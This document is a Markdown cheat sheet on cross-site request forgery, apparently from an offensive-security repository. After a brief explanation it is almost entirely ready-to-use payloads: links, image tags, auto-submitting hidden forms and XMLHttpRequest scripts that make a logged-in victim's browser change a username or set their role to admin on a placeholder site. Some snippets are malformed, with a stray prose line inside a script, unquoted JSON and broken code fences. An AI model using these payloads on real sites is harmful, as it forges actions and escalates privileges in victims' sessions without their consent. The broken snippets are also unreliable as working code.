# CSRF(Cross Site Request Forgery)
>Cross-Site Request Forgery (CSRF) is a type of attack that occurs when a malicious web site, email, blog, instant message, or program causes a user’s web browser to perform an unwanted action on a trusted site when the user is authenticated.

![CSRF Method](https://raw.githubusercontent.com/k2haxor/HACK-THEM-ALL/master/CSRF/CSRF-CheatSheet.png)

## Exploit
When you are logged in to a certain site, you typically have a session. The identifier of that session is stored in a cookie in your browser, and is sent with every request to that site. Even if some other site triggers a request, the cookie is sent along with the request and the request is handled as if the logged in user performed it.

### HTML GET
**User Interaction Required**
```
<a href="http://www.xyz.com/api/setusername?username=k2">Click Me</a>
```
**User Interaction Not Required**
```
<img src="http://www.xyz.com/api/setusername?username=k2">
```

### HTML POST
**User Interaction Required**
```
<form action="http://www.xyz.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="k2" />
 <input type="submit" value="Submit Request" />
</form>
```
**User Interaction Not Required**
```
<form id="autosubmit" action="http://www.xyz.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="k2" />
 <input type="submit" value="Submit Request" />
</form>
 
<script>
 document.getElementById("autosubmit").submit();
</script>
```
### JSON GET
```
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.xyz.com/api/currentuser");
xhr.send();
</script>
```
### JSON POST
```
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.xyz.com/api/setrole");
xhr.setRequestHeader("Content-Type", "text/plain");
You will probably want to also try one or both of these
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.setRequestHeader("Content-Type", "multipart/form-data");
xhr.send('{"role":admin}');
</script>
```
**OR**
`<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.xyz.com/api/setrole");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send('{"role":admin}');
</script>``

```
